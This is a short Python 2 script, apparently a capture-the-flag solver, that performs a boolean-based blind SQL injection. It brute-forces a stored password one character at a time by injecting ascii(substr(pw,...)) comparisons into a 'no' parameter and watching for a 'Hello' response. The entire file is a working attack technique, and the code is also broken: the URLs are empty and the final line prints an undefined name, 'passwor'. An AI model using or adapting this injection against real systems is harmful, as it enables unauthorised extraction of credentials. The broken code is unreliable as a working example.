import urllib, urllib2

req = urllib2.Request('http://', '?no=')
res = urllib2.urlopen(req)
session = res.headers.get('Set-Cookie')

password=''
for i in range(1, 20):
	for j in range(97, 128):
		req = urllib2.Request('no=%27||ascii(id)-103%26%26ascii(substr(pw,'+str(i)+',1))='+str(j)+'%23')
		req.add_header('cookie',session)
		res = urllib2.urlopen(req)
		if res.read().find('<h2>Hello</h2>') != -1:
			print chr(j)
			password+=chr(j)
			break
print passwor